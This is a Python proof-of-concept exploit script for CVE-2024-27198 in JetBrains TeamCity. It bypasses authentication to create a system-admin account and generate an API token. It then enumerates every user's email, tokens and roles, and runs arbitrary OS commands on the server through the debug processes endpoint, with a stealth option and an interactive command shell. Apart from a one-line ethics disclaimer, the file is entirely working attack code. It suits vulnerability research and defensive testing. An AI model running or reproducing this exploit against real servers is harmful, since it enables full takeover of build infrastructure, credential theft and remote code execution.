import argparse
import requests
import json
import sys
import random
import string
import json
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
import subprocess
import re
from urllib.parse import quote_plus
import urllib3

urllib3.disable_warnings()

light_blue = '\033[38;5;87m'
violet = '\33[38;5;63m'
green = '\33[38;5;84m'
red = '\33[38;5;160m'
yellow = '\33[38;5;220m'
grellow = '\33[38;5;106m'
reset = '\033[0m'

def banner():
    print(f"{light_blue}")
    print("""

░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░    ░▒▓██████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░  ░▒▓█▓▒░      ░▒▓█▓▒░     
    
                                                                                    
    """)
    print(f"{reset}")

    print(f"Developed by: {light_blue}@stuub{reset} | Github:{light_blue} https://github.com/stuub{reset}\n")
    print(f"Admin Account Creation & RCE on JetBrains TeamCity in correspondance to {violet}(CVE-2024-27198){reset}")
    print("Purely for ethical and educational purposes")
    print("")
    print(f"Usage: {green}python3 RCity.py -t http://teamcity.com:8111{reset}")

token_name = "".join(random.choices(string.ascii_letters + string.digits, k=10))

def create_admin(target):
    """
    Create an admin user on the target TeamCity server.

    Args:
        target (str): The URL of the target TeamCity server.

    Returns:
        tuple: A tuple containing the response from the server, the password of the new user, and the username of the new user.
    """
    username = f"RCity_Rules_{''.join(random.choices(string.digits, k=3))}"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    email = f"stuub@github.com"
    url = f"{target}/hax?jsp=/app/rest/users;.jsp"
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json"
    }
    ROLE_ID = "SYSTEM_ADMIN"
    SCOPE = "g"
    data = {
        "username": username,
        "password": password,
        "email": email,
        "roles": {
            "role": [
                {
                    "roleId": ROLE_ID,
                    "scope": SCOPE
                }
            ]
        }
    }
    response = requests.post(url, headers=headers, data=json.dumps(data), verify=False, allow_redirects=False)
    return response, password, username

def get_user_id(response_text):
    """
    Extract the user ID from the response text.

    Args:
        response_text (str): The response text in JSON format.

    Returns:
        int: The user ID, or None if the user ID could not be extracted.
    """
    try:
        user_info = json.loads(response_text)
        user_id = user_info.get("id")
        if user_id is None:
            print(f"{red}[-]{reset} 'id' key not found in user JSON response")
        return user_id
    except json.JSONDecodeError as err:
        print(f"{red}[-]{reset} Failed to parse user JSON response: {err}")
        return None
    
def get_tokens(target, user_id, headers):
    tokens_url = f"{target}/hax?jsp=/app/rest/users/id:{user_id}/tokens;.jsp"
    tokens_response = requests.get(tokens_url, headers=headers, verify=False, allow_redirects=False)
    tokens = []
    if tokens_response.status_code == 200:
        tokens_info = json.loads(tokens_response.text)
        for token_info in tokens_info.get("token", []):
            token_name = token_info.get("name")
            if token_name is not None:
                tokens.append(token_name)
    return tokens

def get_roles(target, user_id, headers):
    roles_url = f"{target}/hax?jsp=/app/rest/users/id:{user_id}/roles;.jsp"
    roles_response = requests.get(roles_url, headers=headers, verify=False, allow_redirects=False)
    roles = []
    if roles_response.status_code == 200:
        roles_info = json.loads(roles_response.text)
        for role_info in roles_info.get("role", []):
            role_id = role_info.get("roleId")
            if role_id is not None:
                roles.append(role_id)
    return roles

def enum_all_users(target):
    """
    Get the user IDs, usernames, tokens, and roles of all users on the target TeamCity server.

    Args:
        target (str): The URL of the target TeamCity server.

    Returns:
        list: A list of tuples where the first element is the user ID, the second element is the username, the third element is the email, the fourth element is a list of tokens, and the fifth element is a list of roles.
    """
    url = f"{target}/hax?jsp=/app/rest/users;.jsp"
    headers = {
        "Accept": "application/json"
    }
    response = requests.get(url, headers=headers, verify=False, allow_redirects=False)
    user_ids = []
    if response.status_code == 200:
        users_info = json.loads(response.text)
        for user_info in users_info.get("user", []):
            user_id = user_info.get("id")
            username = user_info.get("username")
            if user_id is not None and username is not None:
                tokens = get_tokens(target, user_id, headers)
                roles = get_roles(target, user_id, headers)
                email_url = f"{target}/hax?jsp=/app/rest/users/id:{user_id}/email;.jsp"
                email_response = requests.get(email_url, verify=False, allow_redirects=False)
                email = [email_response.text] if email_response.status_code == 200 else []
                user_ids.append((user_id, username, email, tokens, roles))
    return user_ids

def create_token(target, user_id, token_name):
    """
    Create a token for a user on the target TeamCity server.

    Args:
        target (str): The URL of the target TeamCity server.
        user_id (str): The ID of the user.
        token_name (str): The name of the token.

    Returns:
        str: The value of the token, or None if the token could not be created.
    """
    url = f"{target}/hax?jsp=/app/rest/users/id:{user_id}/tokens/{token_name};.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }
    try:
        session = requests.Session()
        response = session.post(url, headers=headers, verify=False, allow_redirects=False, timeout=600)
        root = ET.fromstring(response.text)
        token_info = {
            "name": root.attrib.get("name"),
            "value": root.attrib.get("value"),
            "creationTime": root.attrib.get("creationTime"),
        }
        if token_info["value"] is None:
            print(f"{red}[-]{reset} 'value' key not found in token XML response")
        return token_info["value"]
    except requests.exceptions.RequestException as err:
        print("[-] Request error occurred")
        print(err)
        return None
    except ET.ParseError as err:
        print("[-] Couldn't parse token XML response")
        print(err)
        return None
    except Exception as err:
        print("[-] Unexpected error occurred")
        print(err)
        return None
    
def get_csrf(target):
    """
    Get the CSRF token from the target TeamCity server.

    Args:
        target (str): The URL of the target TeamCity server.

    Returns:
        str: The CSRF token, or None if the CSRF token could not be found.
    """
    url = f"{target}/login.html"
    response = requests.get(url, verify=False, allow_redirects=False)
    csrf = response.cookies.get("TCSESSIONID")
    if csrf is None:
        print(f"{red}[-]{reset} 'TCSESSIONID' key not found in cookies")
    return csrf

def get_os_info(target):
    """
    Get the operating system information from the target TeamCity server.

    Args:
        target (str): The URL of the target TeamCity server.

    Returns:
        tuple: A tuple containing the name and architecture of the operating system, or (None, None) if the information could not be found.
    """
    url = f"{target}/hax?jsp=/app/rest/debug/jvm/systemProperties;.jsp"
    try:
        response = requests.get(url, verify=False)
        root = ET.fromstring(response.text)
        os_name = root.find(".//property[@name='os.name']").attrib.get('value')
        os_arch = root.find(".//property[@name='os.arch']").attrib.get('value')
        if os_name is None or os_arch is None:
            print(f"{red}[-]{reset} 'os.name' or 'os.arch' key not found in OS info XML response")
        return os_name, os_arch
    except requests.exceptions.SSLError as err:
        print(f"{red}[-]{reset} SSL error occurred: {err}")
        return None, None
    except ET.ParseError as err:
        print(f"{red}[-]{reset} Failed to parse OS info XML response: {err}")
        return None, None
    
def get_teamcity_version(target):
    """
    Get the TeamCity version from the target TeamCity server.

    Args:
        target (str): The URL of the target TeamCity server.

    Returns:
        str: The TeamCity version, or None if the TeamCity version could not be found.
    """
    url = f"{target}/hax?jsp=/app/rest/server;.jsp"
    try:
        response = requests.get(url, verify=False)
        root = ET.fromstring(response.text)
        teamcity_version = root.attrib.get('version')
        if teamcity_version is None:
            print(f"{red}[-]{reset} 'version' attribute not found in server info XML response")
        return teamcity_version
    except requests.exceptions.SSLError as err:
        print(f"{red}[-]{reset} SSL error occurred: {err}")
        return None
    except ET.ParseError as err:
        print(f"{red}[-]{reset} Failed to parse server info XML response: {err}")
        return None
    except Exception as err:
        print(f"{red}[-]{reset} Failed to get TeamCity version: {err}")
        return None

def get_tomcat_version(target):
    """
    Get the Tomcat version from the target TeamCity server.

    Args:
        target (str): The URL of the target TeamCity server.

    Returns:
        str: The Tomcat version, or None if the Tomcat version could not be found.
    """
    url = f"{target}/res/../admin/diagnostic.jsp"
    curl_command = f"curl -sSik --path-as-is {url}"
    try:
        response = subprocess.check_output(curl_command, shell=True)
        soup = BeautifulSoup(response, 'html.parser')
        tomcat_version_div = soup.find("div", string=re.compile("Server: "))
        if tomcat_version_div:
            tomcat_version = tomcat_version_div.text.split(": ")[1]
            return tomcat_version
        else:
            print(f"{red}[-]{reset} 'Server: ' string not found in HTML response")
            return None
    except subprocess.CalledProcessError as err:
        print(f"{red}[-]{reset} Failed to execute curl command: {err}")
        return None
    except Exception as err:
        print(f"{red}[-]{reset} Failed to parse Tomcat version HTML response: {err}")
        return None


def execute_command(target, os_name, command, token):
    """
    Execute a command on the target TeamCity server.

    Args:
        target (str): The URL of the target TeamCity server.
        os_name (str): The name of the operating system.
        command (str): The command to execute.
        token (str): The token to use for authentication.

    Returns:
        None
    """
    try:
        command_html = quote_plus(command)
        if os_name == "Linux":
            url = f"{target}/app/rest/debug/processes?exePath=/bin/sh&params=-c&params={command_html}"
        elif os_name == "Windows":
            url = f"{target}/app/rest/debug/processes?exePath=cmd.exe&params=/c&params={command_html}"
        else:
            print(f"{red}[-]{reset} Unsupported operating system: {os_name}")
            print(f"{red}[-]{reset} Supported operating systems: Linux, Windows")
            return
        headers = {
            "Authorization": f"Bearer {token}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        }
        response = requests.post(url, headers=headers, verify=False, allow_redirects=False, timeout=600)
        response_text = response.text
        stdout_start = response_text.find("StdOut:") + len("StdOut:")
        stdout_end = response_text.find("StdErr:")
        stdout_content = response_text[stdout_start:stdout_end].strip()
        print(stdout_content)
    except Exception as err:
        print(f"{red}[-]{reset} Failed to execute command: {err}")

def main():
    """
    The main function of the script. Performs the following steps:

    1. Parse the command-line arguments.
    2. Get the Tomcat version.
    3. Gather the OS info.
    4. Create an admin user.
    5. Get the CSRF token.
    6. Create a token.
    7. Enumerate the users.
    8. Execute commands entered by the user.

    Returns:
        None
    """
    try:

        banner()
        parser = argparse.ArgumentParser(description="Teamcity Takeover PoC")
        parser.add_argument("-t", "--target", help="Target URL (http://teamcity.com:8111)", required=True)
        parser.add_argument("-v", "--verbose", help="Increase output verbosity", action="store_true")
        parser.add_argument("-c", "--command", help="RCE command to execute against TeamCity server", required=False)
        parser.add_argument("-s", "--stealth", action="store_true", help="Stealth mode (do not create admin user or token)", required=False)
        parser.add_argument("--no-rce", action="store_true", help="Do not execute RCE command or create auth token", required=False)
        parser.add_argument("--no-enum", action="store_true", help="Do not enumerate users", required=False)


        if '-h' in sys.argv or '--help' in sys.argv:
            print(f"{green}")
            print(f"""


 ▄  █ ▄███▄   █    █ ▄▄      ▄█    ▄▄▄▄▄        ▄  █ ▄███▄   █▄▄▄▄ ▄███▄   
█   █ █▀   ▀  █    █   █     ██   █     ▀▄     █   █ █▀   ▀  █  ▄▀ █▀   ▀  
██▀▀█ ██▄▄    █    █▀▀▀      ██ ▄  ▀▀▀▀▄       ██▀▀█ ██▄▄    █▀▀▌  ██▄▄    
█   █ █▄   ▄▀ ███▄ █         ▐█  ▀▄▄▄▄▀        █   █ █▄   ▄▀ █  █  █▄   ▄▀ 
   █  ▀███▀       ▀ █         ▐                   █  ▀███▀     █   ▀███▀   
  ▀                  ▀                           ▀            ▀            
                                                                           
            """)
            print(f"{reset}")
        args = parser.parse_args()
        target = args.target

        print(f"{green}[*]{reset} Target: {target}")

        print(f"\n{green}[*]{reset} Getting TeamCity version...")
        teamcity_version = get_teamcity_version(target)
        if teamcity_version:
            print(f"{green}[+]{reset} TeamCity Version: {teamcity_version}")
            version_parts = teamcity_version.split('.')
            major_version = int(version_parts[0])
            minor_version = int(version_parts[1])
            if major_version > 2023 or (major_version == 2023 and minor_version > 11):
                print(f"{red}[-]{reset} TeamCity version is too high for RCE to work")
                sys.exit(1)
        else:
            print(f"{red}[-]{reset} Error getting TeamCity version")
            if args.verbose:
                print(f"{red}[-]{reset} TeamCity version: {teamcity_version}")

        print(f"\n{green}[*]{reset} Getting Tomcat version...")
        tomcat_version = get_tomcat_version(target)
        if tomcat_version:
            print(f"{green}[+]{reset} Tomcat Version: {tomcat_version}")
        else:
            print(f"{red}[-]{reset} Error getting Tomcat version")
            if args.verbose:
                print(f"{red}[-]{reset} Tomcat version: {tomcat_version}")

        print(f"\n{green}[*]{reset} Gathering OS Info...")
        os_name, os_arch = get_os_info(target)
        if os_name and os_arch:
            print(f"{green}[+]{reset} OS Name: {os_name}")
            print(f"{green}[+]{reset} OS Architecture: {os_arch}")
        else:
            print(f"{red}[-]{reset} Error gathering OS info")
            if args.verbose:
                print(f"{red}[-]{reset} OS Name Gathered: {os_name}")
                print(f"{red}[-]{reset} OS Architecture: {os_arch}")

        if not args.stealth:
            print(f"\n{green}[*]{reset} Creating Admin user...")
            while True:
                response, password, username = create_admin(target)
                if response.status_code == 200:
                    print(f"{green}[+]{reset} Admin user created successfully")
                    print(f"{green}[+]{reset} Admin user: {username}")
                    print(f"{green}[+]{reset} Password: {password}")
                    user_id = get_user_id(response.text)
                    if user_id:
                        print(f"{green}[*]{reset} User ID: {user_id}")
                    break
                else:
                    print(f"{red}[-]{reset} Error creating Admin user")
                    if args.verbose:
                        print(f"{red}[-]{reset} Status code: {response.status_code}")
                        print(f"{red}[-]{reset} Response: {response.text}")
                    if "already exists" in response.text:
                        print(f"{yellow}[!]{reset} Admin user already exists - Retrying with a different account\n")
                    else:
                        sys.exit(1)

        print(f"\n{green}[*]{reset} Getting CSRF token...")
        csrf = get_csrf(target)
        if csrf:
            print(f"{green}[+]{reset} CSRF token: {csrf}")
        else:
            print(f"{red}[-]{reset} Error getting CSRF token")
            if args.verbose:
                print(f"{red}[-]{reset} CSRF response: {csrf}")

        if not args.no_rce and not args.stealth:
            print(f"\n{green}[*]{reset} Creating token...")
            token_response = create_token(target, user_id, token_name)
            token = token_response 
            if token:
                print(f"{green}[*]{reset} Token created successfully")
                print(f"{green}[+]{reset} Token name: {token_name}\n")
            else:
                print(f"{red}[-]{reset} Error creating token")
                if args.verbose:
                    print(f"{red}[-]{reset} Token response: {token_response}")
                    sys.exit(1)

        if not args.no_enum:
            print(f"{green}[*]{reset} Getting all user information...")
            user_info = enum_all_users(target)
            user_info.sort(key=lambda x: int(x[0]))
            if user_info:
                for user_id, username, email, tokens, roles in user_info:
                    tokens_str = ', '.join(tokens) if tokens else ''
                    roles_str = ', '.join(roles) if roles else ''
                    email_str = email[0] if email else ''
                    print(f"{green}[+]{reset} {light_blue}User ID:{reset} {user_id:<5} {light_blue}Username:{reset} {username:<20} {light_blue}Email:{reset} {email_str:<40} {light_blue}Tokens:{reset} {tokens_str:<20} {light_blue}Roles:{reset} {roles_str}")
            else:
                print(f"{red}[-]{reset} Error getting user information")
                if args.verbose:
                    print(f"{red}[-]{reset} User information response: {user_info}")

        if not args.no_rce and not args.command and not args.stealth:
            print(f"\n{green}[*]{reset} Executing command: {args.command}")
            execute_command(target, os_name, args.command, token)
        elif not args.no_rce and args.command and not args.stealth:
            print(f"\n{green}[*]{reset} Enter a command to execute:")
            while True:
                print("")
                command = input("\33[38;5;86mCommand:\033[0m ")
                if command.lower() == "exit":
                    break
                execute_command(target, os_name, command, token)

    except KeyboardInterrupt:
        print(f"\n\n{yellow}[!]{reset} Keyboard interrupt received, exiting.")
        sys.exit(0)
if __name__ == "__main__":
    main()